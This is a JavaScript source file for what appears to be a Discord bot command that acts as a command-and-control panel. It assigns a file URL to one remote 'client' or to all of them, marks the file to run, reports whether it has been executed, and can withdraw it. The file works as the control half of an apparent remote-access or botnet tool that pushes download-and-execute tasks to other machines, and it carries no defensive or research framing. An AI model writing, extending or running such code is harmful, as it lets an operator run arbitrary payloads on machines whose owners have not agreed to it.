const v = require("../library/ip.js");
const db = require("../models/index.js");

const Op = db.Sequelize.Op;

exports.run = async (client, message, args) => {
    if (args.length < 2) {
        message.channel.send("Must specify ID and URL");
    } else if (args.length == 2) {
        if (args[0] == "all") {
            if (v.validateUrl(args[1])) {
                db.Client.update(
                    {
                        fileToRun: args[1],
                        fileRunStatus: true,
                    },
                    {
                        where: {
                            identifier: {
                                [Op.not]: "a",
                            },
                        },
                    }
                );

                message.channel.send("File set to run to all clients");
            } else if (args[1] == "status") {
                message.channel.send(
                    "Can't show info for all clients, specify ID"
                );
            } else if (args[1] == "stop") {
                db.Client.update(
                    {
                        fileToRun: null,
                        fileRunStatus: false,
                    },
                    {
                        where: {
                            identifier: {
                                [Op.not]: "a",
                            },
                        },
                    }
                );

                message.channel.send("File removed from all clients");
            } else {
                message.channel.send("Invalid ID or URL");
            }
        } else {
            if (v.validateUrl(args[1])) {
                const results = await db.Client.findAll({
                    where: {
                        id: args[0],
                    },
                });

                if (results.length > 0) {
                    db.Client.update(
                        {
                            fileToRun: args[1],
                            fileRunStatus: true,
                        },
                        {
                            where: {
                                id: args[0],
                            },
                        }
                    );

                    message.channel.send("File set to run");
                } else {
                    message.channel.send("Client not found");
                }
            } else if (args[1] == "status") {
                const results = await db.Client.findAll({
                    where: {
                        id: args[0],
                    },
                });

                if (results.length > 0) {
                    message.channel.send(
                        `\`\`\`FILE URL: ${results[0].fileToRun}\nSTATUS: ${
                            results[0].fileRunStatus ? "Awaiting" : "Executed"
                        }\`\`\``
                    );
                } else {
                    message.channel.send("Client not found");
                }
            } else if (args[1] == "stop") {
                const results = await db.Client.findAll({
                    where: {
                        id: args[0],
                    },
                });

                if (results.length > 0) {
                    db.Client.update(
                        {
                            fileToRun: null,
                            fileRunStatus: false,
                        },
                        {
                            where: {
                                id: args[0],
                            },
                        }
                    );

                    message.channel.send("File removed");
                } else {
                    message.channel.send("Client not found");
                }
            } else {
                message.channel.send("Invalid URL");
            }
        }
    }
};
